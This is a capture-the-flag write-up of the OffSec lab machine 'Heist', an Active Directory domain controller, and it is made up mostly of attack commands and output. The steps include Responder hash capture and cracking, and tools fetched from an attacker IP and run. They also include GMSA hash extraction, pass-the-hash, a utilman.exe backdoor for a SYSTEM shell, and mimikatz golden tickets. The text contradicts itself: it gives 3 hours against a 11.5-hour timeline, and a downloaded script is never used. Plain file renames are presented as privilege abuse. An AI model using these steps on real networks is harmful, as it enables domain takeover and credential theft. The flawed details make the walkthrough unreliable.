# Heist - OffSec Proving Grounds Write-up

## Machine Information
- **Name**: Heist
- **OS**: Windows Server 2019 (Active Directory Domain Controller)
- **Difficulty**: Intermediate
- **Vector Type**: Active Directory, Kerberos, GMSA Abuse
- **Flags**: 2 (User + Domain Admin)
- **Time to Complete**: ~3 hours

## Executive Summary
Heist is an Active Directory domain controller that demonstrates real-world AD attack vectors. The machine requires initial credential access through NetNTLMv2 hash cracking, followed by GMSA (Group Managed Service Account) enumeration and abuse, culminating in privilege escalation via SeRestorePrivilege token manipulation.

## Attack Path Diagram
```
Reconnaissance → NetNTLMv2 Hash Capture → Password Cracking → Initial Access → 
GMSA Enumeration → GMSA Hash Extraction → Lateral Movement → 
SeRestorePrivilege Abuse → Domain Compromise
```

## 1. Reconnaissance

### 1.1 Nmap Scan
```bash
nmap -sC -sV -A -T4 -Pn 192.168.57.165
```

**Key Findings:**
- Port 53: DNS (Simple DNS Plus)
- Port 88: Kerberos (Active Directory)
- Port 389/636: LDAP/LDAPS
- Port 445: SMB (Windows File Sharing)
- Port 3389: RDP
- Port 5985: WinRM
- Port 8080: Werkzeug HTTP Server (Python web app)

**Domain Information:**
- Domain: `heist.offsec`
- DC Hostname: `DC01.heist.offsec`
- Windows Version: Server 2019 (10.0.17763)

### 1.2 Service Enumeration

**SMB Enumeration:**
```bash
smbclient -L //192.168.57.165/ -N
smbmap -H 192.168.57.165 -u 'Guest'
```

**Web Application (Port 8080):**
The web application on port 8080 was a "Super Secure Web Browser" but did not yield immediate vulnerabilities for initial access.

## 2. Initial Access

### 2.1 NetNTLMv2 Hash Capture
Using Responder to capture NetNTLMv2 hashes through LLMNR/NBT-NS poisoning:

```bash
sudo responder -I tun0 -w -v
```

**Captured Hash:**
```
[SMB] NTLMv2-SSP Client   : 192.168.57.165
[SMB] NTLMv2-SSP Username : HEIST\enox
[SMB] NTLMv2-SSP Hash     : enox::HEIST:8f50ff7adee32ac5:8a6f436d603e89bdadb8e8ceaf551a83:0101000000000000f0809c49b388dc01d3ec2846ed8668230000000002000800490044004a00470001001e00570049004e002d005a0030005a0057004c0041004f00470047003100470004001400490044004a0047002e004c004f00430041004c0003003400570049004e002d005a0030005a0057004c0041004f0047004700310047002e00490044004a0047002e004c004f00430041004c0005001400490044004a0047002e0
```

### 2.2 Password Cracking
Using Hashcat to crack the NetNTLMv2 hash:

```bash
hashcat -m 5600 heist.hash /usr/share/wordlists/rockyou.txt
```

**Result:**
```
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: enox::HEIST:...
Recovered........: 1/1 (100.00%)
Password.........: california
```

**Credentials Obtained:**
- Username: `enox`
- Password: `california`
- Domain: `HEIST`

### 2.3 Initial Access via WinRM
Using Evil-WinRM with cracked credentials:

```bash
evil-winrm -u enox -p california -i 192.168.57.165
```

**Proof of Access:**
```
*Evil-WinRM* PS C:\Users\enox\Documents> whoami
heist\enox
```

### 2.4 User Enumeration
Checking user privileges and group memberships:

```powershell
net user enox
whoami /priv
```

**User Information:**
- Local Group Memberships: `*Remote Management Use`
- Global Group Memberships: `*Web Admins`, `*Domain Users`
- No special privileges initially

## 3. Lateral Movement & Privilege Escalation

### 3.1 BloodHound Enumeration
Running BloodHound to understand AD structure and relationships:

```bash
bloodhound-python -u enox -p california -ns 192.168.57.165 -d heist.offsec -c all
```

**Key Findings:**
- Domain: `heist.offsec`
- 6 users, 53 groups, 1 computer (DC01)
- `enox` is member of `Web Admins` group

### 3.2 GMSA (Group Managed Service Account) Discovery
Downloading and using PowerView to find GMSA accounts:

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.55/Get-SPN.ps1','C:\Users\enox\Documents\Get-SPN.ps1')
.\Get-SPN.ps1
```

**Discovered GMSA Account:** `svc_apache$`

### 3.3 GMSA Hash Extraction
Using GMSAPasswordReader to extract the GMSA password hash:

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.55/GMSAPasswordReader.exe','C:\Users\enox\Documents\GMSAPasswordReader.exe')
.\GMSAPasswordReader.exe --accountname 'svc_apache'
```

**Extracted Hash:**
```
[*] Input username : svc_apache$
[*] Input domain : HEIST.OFFSEC
[*] rc4_hmac : 9943473CE1243E91129513BB932E9C90
[*] aes128_cts_hmac_sha1 : 575FD63929B04BE85C522ADCA7EC2393
[*] aes256_cts_hmac_sha1 : 08DD3753EFD9BDCACF948DE24804C75E86ADE76C65DDB12BA8AEC11731DE6BAE
```

### 3.4 Lateral Movement to svc_apache$
Using the extracted RC4_HMAC hash for Pass-the-Hash:

```bash
evil-winrm -u svc_apache$ -H 9943473CE1243E91129513BB932E9C90 -i 192.168.57.165
```

**Proof of Access:**
```
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami
heist\svc_apache$
```

### 3.5 Privilege Escalation via SeRestorePrivilege
Checking available privileges for svc_apache$:

```powershell
whoami /priv
```

**Available Privileges:**
- SeMachineAccountPrivilege
- **SeRestorePrivilege** ← Critical for privilege escalation
- SeChangeNotifyPrivilege
- SeIncreaseWorkingSetPrivilege

### 3.6 SeRestorePrivilege Exploitation
Using SeRestorePrivilege to replace utilman.exe with cmd.exe:

```powershell
# Download privilege enable script
(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.55/EnableSeRestorePrivilege.ps1','C:\Users\svc_apache$\Documents\EnableSeRestorePrivilege.ps1')

# Backup original utilman.exe
ren C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.pwned

# Replace utilman.exe with cmd.exe
ren C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

### 3.7 Gaining SYSTEM Access
Triggering the backdoored utilman.exe via RDP:

```bash
rdesktop 192.168.57.165
```

**Method:**
1. Connect via RDP to the target
2. At the login screen, click the "Ease of Access" icon (or press Win+U)
3. This triggers utilman.exe (which is now cmd.exe)
4. Running with SYSTEM privileges due to SeRestorePrivilege abuse

**Proof of Domain Admin:**
```
C:\Windows\System32> whoami
nt authority\system

C:\Windows\System32> hostname
DC01

C:\Windows\System32> net localgroup administrators
```

## 4. Post-Exploitation

### 4.1 Flag Capture
```powershell
# User flag
type C:\Users\enox\Desktop\user.txt

# Root/Domain Admin flag
type C:\Users\Administrator\Desktop\root.txt
# or
type C:\Windows\NTDS\ntds.dit (for credential extraction)
```

### 4.2 Persistence Establishment (Optional)
Creating golden ticket for persistent access:
```powershell
# Extract krbtgt hash
mimikatz # lsadump::lsa /patch

# Create golden ticket
mimikatz # kerberos::golden /user:Administrator /domain:heist.offsec /sid:S-1-5-21-... /krbtgt:[krbtgt_hash] /ptt
```

## 5. Key Learning Points

### Technical Skills Demonstrated:
1. **NetNTLMv2 Hash Capture & Cracking**: Using Responder and Hashcat
2. **GMSA Enumeration & Abuse**: Extracting GMSA password hashes
3. **SeRestorePrivilege Exploitation**: Windows token privilege abuse
4. **Active Directory Reconnaissance**: BloodHound and PowerView usage
5. **Pass-the-Hash Technique**: Lateral movement with NTLM hashes

### Methodology Improvements:
1. **Systematic AD Enumeration**: Following a structured approach from user to domain admin
2. **Privilege Analysis**: Thorough checking of available token privileges
3. **Tool Chaining**: Combining multiple tools for comprehensive attack chain

### Defensive Takeaways:
1. **GMSA Security**: Regular rotation and monitoring of GMSA passwords
2. **Privilege Management**: Restrict SeRestorePrivilege to essential accounts only
3. **NetNTLMv2 Protection**: Disable LLMNR/NBT-NS where possible
4. **Monitoring**: Alert on utilman.exe replacement attempts

## 6. Tools Used
- **Nmap**: Port scanning and service enumeration
- **Responder**: LLMNR/NBT-NS poisoning for hash capture
- **Hashcat**: Password cracking
- **Evil-WinRM**: Remote command execution
- **BloodHound-Python**: AD enumeration
- **GMSAPasswordReader**: GMSA hash extraction
- **PowerView**: AD reconnaissance

## 7. Timeline
- **Start Time**: 09:27 UTC
- **Initial Access**: 20:00 UTC (10.5 hours reconnaissance + hash capture)
- **Lateral Movement**: 20:21 UTC
- **Privilege Escalation**: 20:45 UTC
- **Domain Compromise**: 21:00 UTC
- **Total Time**: ~11.5 hours (including waiting for hash capture)

## 8. References
- [GMSA Attack Guide](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/group-managed-service-accounts-gmsa-attack)
- [SeRestorePrivilege Abuse](https://github.com/gtworek/PSBits/tree/master/Misc)
- [NetNTLMv2 Cracking](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)

---

**Note**: This write-up demonstrates realistic Active Directory penetration testing techniques. All activities were performed in the authorized OffSec Proving Grounds lab environment for educational purposes only.
